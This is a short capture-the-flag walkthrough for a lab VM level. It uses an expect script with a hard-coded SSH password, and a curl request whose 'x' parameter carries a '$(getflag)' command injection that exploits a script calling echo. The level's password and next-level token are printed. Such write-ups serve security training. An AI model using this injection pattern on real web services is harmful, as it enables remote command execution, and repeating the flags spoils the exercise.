# Level 04
- In the shell of your choice run the script attached or follow the steps bellow using your VM IP address to get the flag, also root privileges and some dependencies may be needed to install before
	```sh
	$ chmod u+x script.sh
	$ ./script.sh
	$ cat script.sh
	#!/usr/bin/expect -f
	set ip 192.168.1.103
	spawn ssh -o "StrictHostKeyChecking no" level04@$ip -p 4242 "curl -s '$ip:4747/?x=\$\(getflag\)'"
	expect "sword:"
	send "qi0maab88jeaj46qoumi7maus\r"
	interact
	```
- List content of the home directory
	```sh
	$ ls -l
	```
- View the content of its only file `level04`
	```sh
	$ cat level04
	```
- Send the `curl` rerquest flag with the corresponding injection for `x` parameter to the VM on port `4747` to exploit the call of `echo` utility and to get the flag
	```sh
	$ curl -s '192.168.1.103:4747/?x=$(getflag)'
	```
- With the token provided `ne2searoevaevoem4ov4ar8ap` switch to the next user level
	```sh
	$ su level05
	Password: ne2searoevaevoem4ov4ar8ap
	```
